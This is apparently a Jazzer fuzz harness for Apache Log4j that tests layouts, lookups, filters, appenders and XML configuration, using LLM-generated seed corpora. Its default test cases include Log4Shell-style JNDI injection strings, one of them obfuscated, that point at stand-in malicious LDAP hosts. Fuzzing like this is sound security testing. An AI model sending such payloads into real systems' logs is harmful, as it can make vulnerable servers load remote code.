package org.example;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.ThreadContext;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.message.SimpleMessage;
import org.apache.logging.log4j.core.LogEvent;

import java.io.File;
import java.io.FileReader;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Log4jFuzzer {
    private static final Logger logger = LogManager.getLogger(Log4jFuzzer.class);
    private static long startTime = System.currentTimeMillis();
    private static long totalExecutions = 0;
    private static int crashCount = 0;
    private static final List<String> TEST_CASES = new ArrayList<>();
    private static final Random RANDOM = new Random();
    private static boolean loadedTestCases = false;

    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Shutting down fuzzer, generating final report...");
            generateReport();
        }));

        // Load test cases from our generated files
        loadTestCases();
    }

    private static void loadTestCases() {
        try {
            File corpusDir = new File("../llm_fuzzer/generated_tests/corpus");
            if (corpusDir.exists() && corpusDir.isDirectory()) {
                for (File file : corpusDir.listFiles()) {
                    if (file.isFile() && file.getName().endsWith(".txt")) {
                        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
                            StringBuilder content = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                content.append(line).append("\n");
                            }
                            TEST_CASES.add(content.toString());
                        }
                    }
                }
                System.out.println("Loaded " + TEST_CASES.size() + " test cases from corpus directory");
                loadedTestCases = true;
            } else {
                System.out.println("Corpus directory not found at " + corpusDir.getAbsolutePath());
                addDefaultTestCases();
            }
        } catch (IOException e) {
            System.err.println("Error loading test cases: " + e.getMessage());
            addDefaultTestCases();
        }
    }

    private static void addDefaultTestCases() {
        // Add some default test cases in case our corpus isn't available
        TEST_CASES.add("${jndi:ldap://malicious.example.com/payload}");
        TEST_CASES.add("%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n");
        TEST_CASES.add("{\"key\": \"value\", \"jndi\": \"${jndi:rmi://localhost:1099/jndiLookup}\"}");
        TEST_CASES.add("${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://malicious.com/}");
        TEST_CASES.add("%notaformat %anothernonformat %%percent");
        System.out.println("Added " + TEST_CASES.size() + " default test cases");
        loadedTestCases = true;
    }

    public static void fuzzerTestOneInput(FuzzedDataProvider data) {
        totalExecutions++;

        // Set a timeout for this run
        final long startTimeThisRun = System.currentTimeMillis();
        final long timeoutMillis = 180 * 1000; // 180 seconds

        // Make sure test cases are loaded
        if (!loadedTestCases) {
            loadTestCases();
        }

        // Determine whether to use a predefined test case or raw data
        final boolean usePredefined = !TEST_CASES.isEmpty() &&
                data.remainingBytes() > 0 &&
                data.consumeBoolean();

        final String specialTestCase;
        if (usePredefined) {
            int index = Math.abs(data.consumeInt()) % TEST_CASES.size();
            specialTestCase = TEST_CASES.get(index);
            System.out.println("Using special test case: " +
                    (specialTestCase.length() > 50 ?
                            specialTestCase.substring(0, 50) + "..." :
                            specialTestCase));
        } else {
            specialTestCase = null;
        }

        try {
            // Choose which test method to run
            final int methodToRun = data.remainingBytes() > 0 ? Math.abs(data.consumeInt()) % 9 : 0;

            // Check if we've already exceeded the timeout
            if (System.currentTimeMillis() - startTimeThisRun > timeoutMillis) {
                throw new RuntimeException("Timeout exceeded before method execution");
            }

            // Use a separate thread to execute the test method
            Thread testThread = new Thread(() -> {
                try {
                    switch (methodToRun) {
                        case 0:
                            // Original method: Fuzz PatternLayout
                            if (specialTestCase != null && specialTestCase.contains("%")) {
                                fuzzPatternLayout(data, specialTestCase);
                            } else {
                                fuzzPatternLayout(data);
                            }
                            break;
                        case 1:
                            // Original method: Fuzz Log Messages
                            if (specialTestCase != null) {
                                fuzzLogMessages(data, specialTestCase);
                            } else {
                                fuzzLogMessages(data);
                            }
                            break;
                        case 2:
                            // Original method: Fuzz JSON Layout
                            if (specialTestCase != null && specialTestCase.contains("{")) {
                                fuzzJsonLayout(data, specialTestCase);
                            } else {
                                fuzzJsonLayout(data);
                            }
                            break;
                        case 3:
                            // Original method: Fuzz Message Pattern
                            if (specialTestCase != null && specialTestCase.contains("{")) {
                                fuzzMessagePattern(data, specialTestCase);
                            } else {
                                fuzzMessagePattern(data);
                            }
                            break;
                        // Cases for your LLM-generated methods
                        case 4:
                            fuzzXmlConfiguration(data);
                            break;
                        case 5:
                            fuzzAppenderBuilders(data);
                            break;
                        case 6:
                            fuzzFilters(data);
                            break;
                        case 7:
                            fuzzLookups(data);
                            break;
                        case 8:
                            fuzzLayoutSerialization(data);
                            break;
                        default:
                            // Fall back to a safe method
                            fuzzPatternLayout(data);
                    }
                } catch (Throwable t) {
                    // Catch all exceptions within the test thread
                    recordCrash("Test thread exception: " + t.getMessage(), t);
                }
            });

            // Make the thread a daemon so it won't prevent JVM shutdown
            testThread.setDaemon(true);

            // Start the test and wait with timeout
            testThread.start();
            try {
                testThread.join(timeoutMillis);  // Wait up to the timeout

                // If thread is still alive after timeout, it's stuck
                if (testThread.isAlive()) {
                    // Record the timeout
                    System.err.println("Execution timeout detected for test case: " +
                            (specialTestCase != null ? specialTestCase : "generated data"));

                    recordCrash("Timeout on input: " +
                                    (specialTestCase != null ? specialTestCase : "generated data"),
                            new RuntimeException("Execution exceeded " + (timeoutMillis/1000) + " second timeout"));
                }
            } catch (InterruptedException e) {
                // Main thread was interrupted while waiting for the test to complete
                System.err.println("Main thread interrupted while waiting for test completion");
            }
        } catch (Throwable t) {
            // Catch any issues in the setup or timeout handling
            recordCrash("Setup phase exception: " + t.getMessage(), t);
        }

        // Generate a report after a certain time
        if (totalExecutions % 1000 == 0 && System.currentTimeMillis() - startTime > 60000) {
            generateReport();
        }
    }

    private static void fuzzXmlConfiguration(FuzzedDataProvider data) {
        try {
            // Generate a configuration XML string
            StringBuilder xmlBuilder = new StringBuilder();
            xmlBuilder.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
            xmlBuilder.append("<Configuration status=\"WARN\">\n");
            xmlBuilder.append("  <Appenders>\n");

            // Add a random appender based on fuzzed data
            String appenderName = data.consumeString(10);
            String appenderType = data.consumeBoolean() ? "Console" : "File";

            xmlBuilder.append("    <").append(appenderType).append(" name=\"").append(appenderName).append("\">\n");

            // Add a pattern layout with fuzzed pattern
            String pattern = data.remainingBytes() > 10 ?
                    data.consumeString(Math.min(50, data.remainingBytes())) : "%m%n";
            xmlBuilder.append("      <PatternLayout pattern=\"").append(pattern).append("\"/>\n");

            xmlBuilder.append("    </").append(appenderType).append(">\n");
            xmlBuilder.append("  </Appenders>\n");

            // Add a root logger
            xmlBuilder.append("  <Loggers>\n");
            xmlBuilder.append("    <Root level=\"").append(data.consumeBoolean() ? "INFO" : "ERROR").append("\">\n");
            xmlBuilder.append("      <AppenderRef ref=\"").append(appenderName).append("\"/>\n");
            xmlBuilder.append("    </Root>\n");
            xmlBuilder.append("  </Loggers>\n");
            xmlBuilder.append("</Configuration>");

            String xmlConfig = xmlBuilder.toString();

            // Parse the configuration
            org.apache.logging.log4j.core.config.ConfigurationSource source =
                    new org.apache.logging.log4j.core.config.ConfigurationSource(
                            new java.io.ByteArrayInputStream(xmlConfig.getBytes()));

            org.apache.logging.log4j.core.config.xml.XmlConfiguration config =
                    new org.apache.logging.log4j.core.config.xml.XmlConfiguration(
                            org.apache.logging.log4j.core.LoggerContext.getContext(false), source);

            // Initialize the configuration
            config.initialize();
            config.start();

            // Try to get a logger from the configuration
            config.getLogger("FuzzLogger");

            // Clean up
            config.stop();

        } catch (Exception e) {
            recordCrash("XmlConfiguration", e);
        }
    }

    private static void fuzzAppenderBuilders(FuzzedDataProvider data) {
        try {
            // Test Console Appender
            org.apache.logging.log4j.core.appender.ConsoleAppender.Builder consoleBuilder =
                    org.apache.logging.log4j.core.appender.ConsoleAppender.newBuilder();

            // Fuzz the console appender properties
            consoleBuilder.setName(data.consumeString(10));

            if (data.consumeBoolean()) {
                consoleBuilder.setTarget(
                        data.consumeBoolean() ?
                                org.apache.logging.log4j.core.appender.ConsoleAppender.Target.SYSTEM_OUT :
                                org.apache.logging.log4j.core.appender.ConsoleAppender.Target.SYSTEM_ERR);
            }

            if (data.remainingBytes() > 0 && data.consumeBoolean()) {
                // Create and set a layout
                PatternLayout layout = PatternLayout.newBuilder()
                        .withPattern(data.consumeString(Math.min(50, data.remainingBytes())))
                        .build();
                consoleBuilder.setLayout(layout);
            }

            // Build and start the appender
            org.apache.logging.log4j.core.appender.ConsoleAppender consoleAppender = consoleBuilder.build();
            consoleAppender.start();

            // Now test a File Appender
            if (data.remainingBytes() > 20) {
                org.apache.logging.log4j.core.appender.FileAppender.Builder fileBuilder =
                        org.apache.logging.log4j.core.appender.FileAppender.newBuilder();

                fileBuilder.setName(data.consumeString(10));
                fileBuilder.withFileName("target/fuzz-test-" + System.currentTimeMillis() + ".log");

                if (data.consumeBoolean()) {
                    fileBuilder.withAppend(data.consumeBoolean());
                }

                if (data.consumeBoolean()) {
                    fileBuilder.withBufferedIo(data.consumeBoolean());
                }

                if (data.consumeBoolean() && data.remainingBytes() > 0) {
                    fileBuilder.withBufferSize(data.consumeInt(1, 8192));
                }

                // Build but don't start (to avoid creating too many files)
                fileBuilder.build();
            }

            // Stop the console appender
            consoleAppender.stop();

        } catch (Exception e) {
            recordCrash("AppenderBuilders", e);
        }
    }

    private static void fuzzFilters(FuzzedDataProvider data) {
        try {
            // Test various filter implementations

            // 1. ThresholdFilter
            org.apache.logging.log4j.core.filter.ThresholdFilter thresholdFilter =
                    org.apache.logging.log4j.core.filter.ThresholdFilter.createFilter(
                            data.consumeBoolean() ? Level.ERROR : Level.INFO,
                            data.consumeBoolean() ?
                                    org.apache.logging.log4j.core.Filter.Result.ACCEPT :
                                    org.apache.logging.log4j.core.Filter.Result.DENY,
                            data.consumeBoolean() ?
                                    org.apache.logging.log4j.core.Filter.Result.DENY :
                                    org.apache.logging.log4j.core.Filter.Result.NEUTRAL
                    );

            thresholdFilter.start();

            // Create a log event to test the filter
            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FilterTest")
                    .setLevel(data.consumeBoolean() ? Level.ERROR : Level.INFO)
                    .setMessage(new SimpleMessage("Filter test message"))
                    .build();

            // Test the filter
            thresholdFilter.filter(event);

            // 2. LevelMatchFilter
            if (data.remainingBytes() > 10) {
                org.apache.logging.log4j.core.filter.LevelMatchFilter levelMatchFilter =
                        org.apache.logging.log4j.core.filter.LevelMatchFilter.newBuilder()
                                .setLevel(data.consumeBoolean() ? Level.DEBUG : Level.WARN)
                                .setOnMatch(data.consumeBoolean() ?
                                        org.apache.logging.log4j.core.Filter.Result.ACCEPT :
                                        org.apache.logging.log4j.core.Filter.Result.DENY)
                                .setOnMismatch(data.consumeBoolean() ?
                                        org.apache.logging.log4j.core.Filter.Result.NEUTRAL :
                                        org.apache.logging.log4j.core.Filter.Result.ACCEPT)
                                .build();

                levelMatchFilter.start();
                levelMatchFilter.filter(event);
                levelMatchFilter.stop();
            }

            // 3. LevelRangeFilter
            if (data.remainingBytes() > 10) {
                Level minLevel = data.consumeBoolean() ? Level.DEBUG : Level.INFO;
                Level maxLevel = data.consumeBoolean() ? Level.ERROR : Level.FATAL;

                org.apache.logging.log4j.core.filter.LevelRangeFilter levelRangeFilter =
                        org.apache.logging.log4j.core.filter.LevelRangeFilter.createFilter(
                                minLevel,
                                maxLevel,
                                data.consumeBoolean() ?
                                        org.apache.logging.log4j.core.Filter.Result.ACCEPT :
                                        org.apache.logging.log4j.core.Filter.Result.DENY,
                                data.consumeBoolean() ?
                                        org.apache.logging.log4j.core.Filter.Result.DENY :
                                        org.apache.logging.log4j.core.Filter.Result.NEUTRAL
                        );

                levelRangeFilter.start();
                levelRangeFilter.filter(event);
                levelRangeFilter.stop();
            }

            thresholdFilter.stop();

        } catch (Exception e) {
            recordCrash("Filters", e);
        }
    }

    private static void fuzzLookups(FuzzedDataProvider data) {
        try {
            // Test various lookup implementations

            // 1. Environment lookup
            org.apache.logging.log4j.core.lookup.EnvironmentLookup envLookup =
                    new org.apache.logging.log4j.core.lookup.EnvironmentLookup();

            // Generate some environment variable names to look up
            String[] envVars = {"PATH", "HOME", "USER", "JAVA_HOME"};
            String lookupKey = envVars[data.consumeInt(0, envVars.length - 1)];

            // Try the lookup
            envLookup.lookup(null, lookupKey);

            // 2. Java lookup
            if (data.remainingBytes() > 5) {
                org.apache.logging.log4j.core.lookup.JavaLookup javaLookup =
                        new org.apache.logging.log4j.core.lookup.JavaLookup();

                String[] javaProps = {"version", "runtime", "vm", "os", "locale"};
                String javaKey = javaProps[data.consumeInt(0, javaProps.length - 1)];

                javaLookup.lookup(null, javaKey);
            }

            // 3. Map lookup with variable substitution
            if (data.remainingBytes() > 10) {
                java.util.Map<String, String> map = new java.util.HashMap<>();

                // Add some entries to the map
                String key1 = data.consumeString(5);
                String value1 = data.consumeString(10);
                map.put(key1, value1);

                if (data.remainingBytes() > 10) {
                    String key2 = data.consumeString(5);
                    String value2 = data.consumeString(10);
                    map.put(key2, value2);

                    // Add one with a reference to the other
                    map.put("combined", "${" + key1 + "}-${" + key2 + "}");
                }

                org.apache.logging.log4j.core.lookup.MapLookup mapLookup =
                        new org.apache.logging.log4j.core.lookup.MapLookup(map);

                // Try lookups
                mapLookup.lookup(null, key1);

                if (map.containsKey("combined")) {
                    // This should trigger interpolation
                    org.apache.logging.log4j.core.lookup.StrSubstitutor strSubstitutor =
                            new org.apache.logging.log4j.core.lookup.StrSubstitutor(map);
                    strSubstitutor.replace("${" + key1 + "}");
                }
            }

            // 4. Date lookup
            if (data.remainingBytes() > 5) {
                org.apache.logging.log4j.core.lookup.DateLookup dateLookup =
                        new org.apache.logging.log4j.core.lookup.DateLookup();

                String[] datePatterns = {"yyyy-MM-dd", "HH:mm:ss", "yyyy-MM-dd HH:mm:ss", "dd MMM yyyy"};
                String datePattern = datePatterns[data.consumeInt(0, datePatterns.length - 1)];

                dateLookup.lookup(null, datePattern);
            }

        } catch (Exception e) {
            recordCrash("Lookups", e);
        }
    }

    private static void fuzzLayoutSerialization(FuzzedDataProvider data) {
        try {
            // Test various layout implementations and their serialization

            // 1. PatternLayout serialization
            String patternStr = data.remainingBytes() > 10 ?
                    data.consumeString(Math.min(50, data.remainingBytes())) : "%m%n";

            PatternLayout patternLayout = PatternLayout.newBuilder()
                    .withPattern(patternStr)
                    .withAlwaysWriteExceptions(data.consumeBoolean())
                    .withNoConsoleNoAnsi(data.consumeBoolean())
                    .build();

            // Create a log event
            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("LayoutTest")
                    .setLevel(data.consumeBoolean() ? Level.INFO : Level.ERROR)
                    .setMessage(new SimpleMessage("Layout test message"))
                    .build();

            // Test various serialization methods
            patternLayout.toByteArray(event);
            patternLayout.toSerializable(event);
            patternLayout.toString();

            // 2. Try HtmlLayout if we have enough data
            if (data.remainingBytes() > 10) {
                try {
                    org.apache.logging.log4j.core.layout.HtmlLayout htmlLayout =
                            org.apache.logging.log4j.core.layout.HtmlLayout.newBuilder()
                                    .withTitle(data.consumeString(20))
                                    .withContentType(data.consumeBoolean() ? "text/html; charset=UTF-8" : "text/html")
                                    .withCharset(java.nio.charset.StandardCharsets.UTF_8)
                                    .withFontName(data.consumeBoolean() ? "Arial" : "Courier")
                                    .withFontSize(data.consumeBoolean() ?
                                            org.apache.logging.log4j.core.layout.HtmlLayout.FontSize.SMALL :
                                            org.apache.logging.log4j.core.layout.HtmlLayout.FontSize.MEDIUM)
                                    .build();

                    // Serialize
                    htmlLayout.toByteArray(event);
                    htmlLayout.toSerializable(event);
                } catch (Throwable e) {
                    recordCrash("HtmlLayout", e);
                }
            }

            // 3. Try CsvLayout if we have enough data - using try-catch to avoid dependency issues
            if (data.remainingBytes() > 10) {
                try {
                    // First check if the class is available
                    Class<?> csvFormatClass = Class.forName("org.apache.commons.csv.CSVFormat");
                    if (csvFormatClass != null) {
                        // If we reach here, the class is available
                        // Use a simple version to avoid method signature issues
                        org.apache.logging.log4j.core.layout.CsvLogEventLayout csvLayout =
                                org.apache.logging.log4j.core.layout.CsvLogEventLayout.createDefaultLayout();

                        // Serialize if we have a valid layout
                        if (csvLayout != null) {
                            csvLayout.toByteArray(event);
                            csvLayout.toSerializable(event);
                        }
                    }
                } catch (ClassNotFoundException e) {
                    // Skip silently - the dependency is not available
                    System.out.println("Skipping CsvLogEventLayout test - commons-csv dependency not available");
                } catch (Throwable e) {
                    recordCrash("CsvLayout", e);
                }
            }

        } catch (Throwable e) {
            recordCrash("LayoutSerialization", e);
        }
    }

    private static void fuzzPatternLayout(FuzzedDataProvider data) {
        String pattern = "";
        try {
            // Ensure we have some data to consume
            if (data.remainingBytes() > 0) {
                pattern = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                pattern = "%m%n"; // Default pattern if no data
            }

            PatternLayout layout = PatternLayout.newBuilder()
                    .withPattern(pattern)
                    .build();

            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FuzzerLogger")
                    .setLevel(Level.INFO)
                    .setMessage(new SimpleMessage("Fuzzed layout test"))
                    .build();

            layout.toByteArray(event);
        } catch (Exception e) {
            recordCrash("PatternLayout with pattern: " + pattern, e);
        }
    }

    private static void fuzzPatternLayout(FuzzedDataProvider data, String pattern) {
        try {
            PatternLayout layout = PatternLayout.newBuilder()
                    .withPattern(pattern)
                    .build();

            LogEvent event = Log4jLogEvent.newBuilder()
                    .setLoggerName("FuzzerLogger")
                    .setLevel(Level.INFO)
                    .setMessage(new SimpleMessage("Fuzzed layout test"))
                    .build();

            layout.toByteArray(event);
        } catch (Exception e) {
            recordCrash("PatternLayout with special pattern: " + pattern, e);
        }
    }

    private static void fuzzLogMessages(FuzzedDataProvider data) {
        String message = "";
        try {
            // Ensure we have data to consume
            if (data.remainingBytes() > 0) {
                message = data.consumeString(Math.min(100, data.remainingBytes()));
            } else {
                message = "default message";
            }

            // Test logging the fuzzer-generated message
            logger.info("Test message: {}", message);
            logger.error("Error with parameter: {}", message);

            // Try a dynamic log level if we have more data
            if (data.remainingBytes() > 0) {
                String levelStr = data.consumeString(Math.min(10, data.remainingBytes())).toUpperCase();
                Level level = Level.toLevel(levelStr, Level.INFO);
                logger.log(level, "Message at dynamic level: {}", message);
            }

            // Try context-based logging
            ThreadContext.put("fuzzKey", message);
            logger.info("Context map with fuzzed key: {}", message);
            ThreadContext.clearAll();
        } catch (Exception e) {
            recordCrash("LogMessages with message: " + message, e);
        }
    }

    private static void fuzzLogMessages(FuzzedDataProvider data, String message) {
        try {
            // Test logging the fuzzer-generated message
            logger.info("Test message: {}", message);
            logger.error("Error with parameter: {}", message);

            // Try a dynamic log level if we have more data
            if (data.remainingBytes() > 0) {
                String levelStr = data.consumeString(Math.min(10, data.remainingBytes())).toUpperCase();
                Level level = Level.toLevel(levelStr, Level.INFO);
                logger.log(level, "Message at dynamic level: {}", message);
            }

            // Try context-based logging
            ThreadContext.put("fuzzKey", message);
            logger.info("Context map with fuzzed key: {}", message);
            ThreadContext.clearAll();
        } catch (Exception e) {
            recordCrash("LogMessages with special message: " + message, e);
        }
    }

    private static void fuzzJsonLayout(FuzzedDataProvider data) {
        try {
            // Try to dynamically check if the Jackson classes are available
            try {
                Class.forName("com.fasterxml.jackson.databind.ser.FilterProvider");

                // Only proceed if the class is available
                // Safely handle the input
                boolean properties = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean complete = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean compact = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean eventEol = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean includeStacktrace = data.remainingBytes() > 0 ? data.consumeBoolean() : false;

                // Test JSON layout
                org.apache.logging.log4j.core.layout.JsonLayout layout =
                        org.apache.logging.log4j.core.layout.JsonLayout.newBuilder()
                                .setProperties(properties)
                                .setComplete(complete)
                                .setCompact(compact)
                                .setEventEol(eventEol)
                                .setIncludeStacktrace(includeStacktrace)
                                .build();

                // Create a test log event
                String message = data.remainingBytes() > 0 ?
                        data.consumeString(Math.min(100, data.remainingBytes())) :
                        "default message";

                org.apache.logging.log4j.core.LogEvent event =
                        org.apache.logging.log4j.core.impl.Log4jLogEvent.newBuilder()
                                .setLoggerName("test")
                                .setLevel(org.apache.logging.log4j.Level.INFO)
                                .setMessage(new org.apache.logging.log4j.message.SimpleMessage(message))
                                .build();

                // Format the event
                layout.toSerializable(event);
            } catch (ClassNotFoundException e) {
                // Jackson dependency is missing, skip this test silently
                System.out.println("Skipping JsonLayout test - Jackson dependency not available");
            }
        } catch (Exception e) {
            recordCrash("JsonLayout", e);
        }
    }

    private static void fuzzJsonLayout(FuzzedDataProvider data, String jsonContent) {
        try {
            try {
                Class.forName("com.fasterxml.jackson.databind.ser.FilterProvider");

                // Only proceed if the class is available
                boolean properties = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean complete = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean compact = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean eventEol = data.remainingBytes() > 0 ? data.consumeBoolean() : false;
                boolean includeStacktrace = data.remainingBytes() > 0 ? data.consumeBoolean() : false;

                // Test JSON layout
                org.apache.logging.log4j.core.layout.JsonLayout layout =
                        org.apache.logging.log4j.core.layout.JsonLayout.newBuilder()
                                .setProperties(properties)
                                .setComplete(complete)
                                .setCompact(compact)
                                .setEventEol(eventEol)
                                .setIncludeStacktrace(includeStacktrace)
                                .build();

                // Create a test log event with the special JSON content
                org.apache.logging.log4j.core.LogEvent event =
                        org.apache.logging.log4j.core.impl.Log4jLogEvent.newBuilder()
                                .setLoggerName("test")
                                .setLevel(org.apache.logging.log4j.Level.INFO)
                                .setMessage(new org.apache.logging.log4j.message.SimpleMessage(jsonContent))
                                .build();

                // Format the event
                layout.toSerializable(event);
            } catch (ClassNotFoundException e) {
                System.out.println("Skipping JsonLayout test - Jackson dependency not available");
            }
        } catch (Exception e) {
            recordCrash("JsonLayout with special content: " + jsonContent, e);
        }
    }

    private static void fuzzMessagePattern(FuzzedDataProvider data) {
        String pattern = "";
        try {
            // Test message pattern formatting with at least some content
            if (data.remainingBytes() > 0) {
                pattern = data.consumeString(Math.min(50, data.remainingBytes()));
            } else {
                pattern = "Default pattern";
            }

            String param1 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param1";

            String param2 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param2";

            org.apache.logging.log4j.message.MessageFormatMessage message =
                    new org.apache.logging.log4j.message.MessageFormatMessage(
                            pattern,
                            param1,
                            param2);

            // Format the message
            message.getFormattedMessage();
        } catch (Exception e) {
            recordCrash("MessagePattern with pattern: " + pattern, e);
        }
    }

    private static void fuzzMessagePattern(FuzzedDataProvider data, String pattern) {
        try {
            String param1 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param1";

            String param2 = data.remainingBytes() > 0 ?
                    data.consumeString(Math.min(20, data.remainingBytes())) :
                    "param2";

            org.apache.logging.log4j.message.MessageFormatMessage message =
                    new org.apache.logging.log4j.message.MessageFormatMessage(
                            pattern,
                            param1,
                            param2);

            // Format the message
            message.getFormattedMessage();
        } catch (Exception e) {
            recordCrash("MessagePattern with special pattern: " + pattern, e);
        }
    }



    private static void recordCrash(String input, Throwable t) {
        crashCount++;
        try (FileWriter writer = new FileWriter("fuzzing_crashes.txt", true)) {
            writer.write("=== CRASH #" + crashCount + " ===\n");
            writer.write("Input: " + input + "\n");
            writer.write("Exception: " + t.getClass().getName() + ": " + t.getMessage() + "\n");

            // Record stack trace
            writer.write("Stack trace:\n");
            for (StackTraceElement element : t.getStackTrace()) {
                writer.write("  " + element.toString() + "\n");
            }
            writer.write("============\n\n");
        } catch (IOException ioEx) {
            System.err.println("Failed to write crash: " + ioEx.getMessage());
        }
    }

    private static void generateReport() {
        try (FileWriter writer = new FileWriter("fuzzing_summary.txt")) {
            writer.write("Fuzzing Summary:\n");
            writer.write("----------------\n");
            writer.write("Total executions: " + totalExecutions + "\n");
            writer.write("Total runtime: " + (System.currentTimeMillis() - startTime) / 1000 + " seconds\n");
            writer.write("Average executions per second: " +
                    (totalExecutions / ((System.currentTimeMillis() - startTime) / 1000.0)) + "\n");
            writer.write("Total crashes detected: " + crashCount + "\n");
            writer.write("Used LLM-generated test cases: " + (loadedTestCases ? "Yes" : "No") + "\n");
            writer.write("Number of test cases: " + TEST_CASES.size() + "\n");

            // Count corpus files to get a sense of growth
            try {
                File corpusDir = new File("../llm_fuzzer/generated_tests/corpus");
                if (corpusDir.exists() && corpusDir.isDirectory()) {
                    int corpusFileCount = corpusDir.listFiles(file -> file.isFile() && file.getName().endsWith(".txt")).length;
                    writer.write("Total corpus size (including extracted patterns): " + corpusFileCount + "\n");
                }
            } catch (Exception e) {
                // Skip if there's an issue
            }

            // Add information about LLM-generated fuzz methods
            try {
                File methodNamesFile = new File("../llm_fuzzer/generated_tests/fuzz_methods/method_names.txt");
                if (methodNamesFile.exists()) {
                    BufferedReader reader = new BufferedReader(new FileReader(methodNamesFile));
                    String methodNames = reader.readLine();
                    reader.close();

                    if (methodNames != null && !methodNames.isEmpty()) {
                        String[] methods = methodNames.split(",");
                        writer.write("\nLLM-Generated Fuzz Methods: " + methods.length + "\n");
                        writer.write("Methods: " + methodNames + "\n");
                    }
                }
            } catch (IOException e) {
                // Just skip if we can't read the file
            }

            writer.write("\nThis summary shows how many fuzzing iterations were executed.\n");
            writer.write("While we can't directly measure code coverage of Log4j,\n");
            writer.write("higher execution counts generally correlate with better coverage.\n");

            // Add crash information
            writer.write("\nCrash Summary:\n");
            if (new File("fuzzing_crashes.txt").exists()) {
                writer.write("Crashes detected and saved to fuzzing_crashes.txt\n");
                // You could process the file here to count unique crash types
            } else {
                writer.write("No crashes detected.\n");
            }
        } catch (IOException e) {
            System.err.println("Failed to write fuzzing report: " + e.getMessage());
        }
    }
}